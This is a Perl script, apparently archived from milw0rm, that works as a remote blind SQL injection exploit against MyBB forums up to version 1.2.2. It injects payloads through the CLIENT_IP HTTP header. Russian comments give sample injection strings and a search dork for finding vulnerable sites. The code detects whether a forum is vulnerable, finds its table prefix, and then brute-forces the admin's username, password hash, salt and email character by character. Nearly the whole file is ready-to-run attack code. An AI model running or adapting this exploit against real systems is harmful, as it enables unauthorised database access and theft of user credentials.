#!/usr/bin/perl
###########################################################
#########################  LOGO  ##########################
###########################################################
#     Mybb <= 1.2.2 Remote SQL Injecton Exploit v.2.0     #
#                                                         #
#       [u]used:   SQL CLIENT_IP vulnerability            #
#       [!]need:   Mysql >= 4.1                           #
#       [w]work:   blind sql-inj                          #
#       [g]google: Powered By MyBB                        #
#                                                         #
#               coded by Elekt (antichat.ru)              #
###########################################################
#######################  Coments  #########################
###########################################################
#
# Описание:
# Работа эксплойта основана на sql-инъекции в HTTP_CLIENT_IP.
# Неавторизованный пользователь может выполнить произвольный SQL-запрос в базу.
#
# http://host.com/mybb/index.php
# MySQL error: 1064
# You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '">'' at line 3
# Query: DELETE FROM mybb_sessions WHERE ip=''">'
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Это новая версия эксплойта. 
# Мной был найден способ отказаться от использования benchmark,
# что позволяет ускорить работу эксплойта, повысить надежность полученных данных.
# 
# Работа эксплойта основана на провоцировании "Subquery returns more than 1 row" ошибки,
# что позволяет произвести blind-sql-inj: 
# 
# mybb
# match: "Subquery returns more than 1 row"
# CLIENT_IP: 123' or 1=(select null from mybb_users where length(if(ascii(substring((select password from mybb_users where uid=1),1,1))>1,password,uid))<5)/*
# CLIENT_IP: 123' or 1=(select null from mybb_users where length(if(ascii(substring((select password from mybb_users where uid=1),1,1))>254,password,uid))<5)/*
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# 
# Полезные таблицы и поля:
# mybb_1.2.1: mybb_users - uid,username,password,salt,email,loginkey,icq,aim,regip
# 
# Алгоритм генерации паролей в mybb:
# md5(md5($salt).md5($password))
# generate_salt{return random_str(8);}
# 
###########################################################
#########################  init  ###########################
###########################################################

use LWP::UserAgent; 
$sock = LWP::UserAgent->new();

$|=1;

&header();


###########################################################
#######################  Options  #########################
###########################################################

if (@ARGV < 2) {&info(); exit();}

$host = $ARGV[0]; # сервак
$dir = $ARGV[1];  # дира с форумом
$uid = 2;         # акк админа по дефаулту
$uid = $ARGV[2] if $ARGV[2];

$debug = 0;            # режим отладки
$space = "char(58)";   # разделитель столбцов
#$search = "password";  # что брутим, собственно...
#$search = "concat(uid,$space,password,$space,salt)"; # uid:password:salt
$search = "concat(uid,$space,username,$space,password,$space,salt,$space,email)"; # uid:username:password:salt:email
$search = $ARGV[3] if $ARGV[3];

# $presetascii - диапазон ascii-кодов для брута вероятных данных
# $presetascii = "0123456789abcdef";
# $presetascii = "0123456789"
# $presetascii = "abcdefghijklmnopqrstuvwxyz"
# $presetascii = "0123456789abcdefghijklmnopqrstuvwxyz"
# $presetascii = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя");
# цикл, для простоты задаёт все символы для перебора 
$i=0;
while($i<=255){
$presetascii.=chr($i);$i++;
}

###########################################################
#########################  go!  ###########################
###########################################################


$time=localtime;
&log ("[i] Start time  $time\n");
&log ("[+] HOST \"$host\"\n");
&log ("[+] DIR  \"$dir\"\n");
&log ("[+] UID  \"$uid\"\n");
&log ("[+] Search  \"$search\"\n");

###########################################################
###### detecting vulnerability and searching prefix #######
###########################################################

# detecting vulnerability and searching prefix
&log ("[~] Testing forum vulnerabile... ");
$q = "";
$prefix=query($q,$host,$dir);
if($prefix ne "not_find"){&log ("Yes! Forum vulnerable!\n");sleep(1);&log ("[~] Searching prefix...");sleep(1);&log (" prefix find - \"$prefix\"\n"); }
else 
    {
     &log ("Sorry. Forum unvulnerable\n");
	 &footer();
     exit();
    }


###########################################################
#####################   brutforce   #######################
###########################################################

# brutforce
&log ("[~] Brutforce begin! it may take some time, plz, wait...\n");
$kol=1;
for ($control=0;$control==0;){
   &log("\n---------------- Simvol $kol ----------------\n\n") if $debug;
   $amin = 1;
   $amax = length($presetascii)-1;
   $n=0;

   # если диапазон 4 и более символов, переопределяем диапазон, уменьшая его в 2 раза
   while (($amax-$amin)>=4){
        print ("-> Try ".ord(substr($presetascii,$amin,1))." .. ".ord(substr($presetascii,$amax,1))." -> ") if $debug;;
	#$q = "or 1=if((ascii(substring((select ".$search." from ".$prefix."users where uid='".$uid."'),".$kol.",1))>=".ord(substr($presetascii,int($amax-($amax-$amin)/2),1))."),1,benchmark(".$benchmark.",md5(char(114,115,116))))/*";
	$q = "or 1=(select null from ".$prefix."users where length(if((ascii(substring((select ".$search." from ".$prefix."users where uid='".$uid."'),".$kol.",1))>=".ord(substr($presetascii,int($amax-($amax-$amin)/2),1))."),password,uid))<5)/*";
        if (query($q,$host,$dir) eq "not_find") { 
          print ("Char>=".ord(substr($presetascii,int($amax-($amax-$amin)/2),1))."\n") if $debug;;
          $amin=int($amax-($amax-$amin)/2); }
        else { 
          print ("Char<".ord(substr($presetascii,int($amax-($amax-$amin)/2),1))."\n") if $debug;;
          $amax=int($amax-($amax-$amin)/2); };
   }
   
   # если диапазон менее 4-х символов, то переходим к перебору
   while ($amin<=$amax) {
     print ("-> Try ".ord(substr($presetascii,$amin,1))." ->") if $debug;;
     # проверяем ответ скрипта, если ответ положительный то выводим символ и ищем следующий символ в слове, если не определяем символ - выход.
	#$q = "or 1=if((ascii(substring((select ".$search." from ".$prefix."users where uid='".$uid."'),".$kol.",1))=".ord(substr($presetascii,$amin,1))."),1,benchmark(".$benchmark.",md5(char(114,115,116))))/*";
	$q = "or 1=(select null from ".$prefix."users where length(if((ascii(substring((select ".$search." from ".$prefix."users where uid='".$uid."'),".$kol.",1))=".ord(substr($presetascii,$amin,1))."),password,uid))<5)/*";
     if (query($q,$host,$dir) eq "not_find") {
          &log (" FOUND!\n-> Ascii: ".ord(substr($presetascii,$amin,1))."\n-> Char: \"".substr($presetascii,$amin,1)."\"\n") if $debug;; 
          &log ("[$kol] Find - ascii:\"".ord(substr($presetascii,$amin,1))."\", char:\"".substr($presetascii,$amin,1)."\"\n") if !$debug;
          $rezultat_char = $rezultat_char.substr($presetascii,$amin,1); 
          $rezultat_ascii = $rezultat_ascii.ord(substr($presetascii,$amin,1)).","; 
          $amin=$amax+1;$control=1;}
        else { print (" NO =(\n") if $debug; $amin=$amin+1; };
   }
   if ($control==0) { 
     if($amin!=5){$rezultat_char = $rezultat_char."?";$rezultat_ascii = $rezultat_ascii."?,";
                  &log ("[$kol] Error! not found =( $amin\n") if !$debug;
                  &log (" Error! not found =(\n") if $debug;
     }else{$control=1;}
   }else {$control=0;}
   $kol++;
}

print ("\n[!] Yyyy-a-a-a-h-h-uuu!!!\n");
&log ("\n[*] Char: $rezultat_char\n[*] Ascii: $rezultat_ascii\n");
$time=localtime;
&log ("\n[i] Finish time  $time\n\n");


&footer();
exit();

###########################################################
########################  log   ##########################
###########################################################
# лог
sub log($)
    {
     open(RES,">>".$host."_log.txt") || die "[-] Cannot open log file!"; ## Открываем лог для дозаписи
     print ("$_[0]");
     print RES ("$_[0]");
     close(RES);
    }

###########################################################
######################## footer  ##########################
###########################################################
# эпилог
sub footer()
    {
     print ("[G] Greets: Elekt (antichat.ru), 1dt.w0lf (rst/ghc)\n");
     print ("[L] Visit : www.antichat.ru\n");
    }


###########################################################
######################## header  ##########################
###########################################################
# хидер
sub header()
{
print q(
=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=
+     Mybb <= 1.2.2 Remote SQL Injecton Exploit v.2.0     +
+                                                         +
+       [i]used:   SQL CLIENT_IP vulnerability            +
+       [!]need:   Mysql >= 4.1                           +
+       [w]work:   blind sql-inj                          +
+       [i]google: Powered By MyBB                        +
+                                                         +
+               coded by Elekt (antichat.ru)              +
=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_+
);
}


###########################################################
########################  info   ##########################
###########################################################
# инфо
sub info()
{
 print q(
[i] Usage: 
 perl mybb122exp.pl [host] [/dir/] [uid] [search]
*-required
  *[host] - target host without http://
  *[/dir/] - installed forums dir
   [uid] - user uid (default=2)
   [search] - data (uid:username:password:salt:email)
	   
[E] Example: perl mybb122exp.pl host.com /forum/ 1 password

[i] mybb: md5(md5($salt).md5($password))

 );
}

###########################################################
#######################  sender   #########################
###########################################################
# процедура приема\посылки данных
sub query()
    {
     #&log ("\n\n$q\n\n") if $debug;
     my($q,$host,$dir) = @_;
     $res = $sock->get("http://".$host.$dir."index.php",'USER_AGENT'=>'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)','CLIENT_IP'=>"' ".$q); 
     if($res->is_success)
        {
             if($res->as_string =~ /FROM (.*)sessions/) { return $1; } else {return "not_find";}
        }
     else{&log ("\n[!] Connection to $host FAILED! EXIT\n"); exit;}
    }

# milw0rm.com [2007-04-12]
